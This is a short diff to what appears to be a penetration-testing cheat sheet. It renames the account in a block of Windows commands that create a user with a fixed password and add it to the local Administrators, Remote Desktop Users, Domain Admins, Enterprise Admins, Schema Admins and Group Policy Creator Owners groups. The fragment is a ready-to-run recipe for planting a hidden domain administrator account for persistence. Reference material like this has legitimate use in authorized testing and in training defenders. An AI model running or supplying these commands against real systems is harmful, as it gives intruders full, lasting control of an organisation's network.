@@ -63,13 +63,13 @@ cmd.exe /c net localgroup "Remote Desktop Users" c1dn3y /add
 ```
 ## Add a Windows Domain Administrator
 ```
-cmd.exe /c net user siren superPassword /add
-net localgroup Administrators siren /ADD /DOMAIN
-net localgroup "Remote Desktop Users" siren /ADD /DOMAIN
-net group "Domain Admins" siren /ADD /DOMAIN
-net group "Enterprise Admins" siren /ADD /DOMAIN
-net group "Schema Admins" siren /ADD /DOMAIN
-net group "Group Policy Creator Owners" siren /ADD /DOMAIN
+cmd.exe /c net user hacker superPassword /add
+net localgroup Administrators hacker /ADD /DOMAIN
+net localgroup "Remote Desktop Users" hacker /ADD /DOMAIN
+net group "Domain Admins" hacker /ADD /DOMAIN
+net group "Enterprise Admins" hacker /ADD /DOMAIN
+net group "Schema Admins" hacker /ADD /DOMAIN
+net group "Group Policy Creator Owners" hacker /ADD /DOMAIN
 ```
 ## Access Check enumeration
 ```
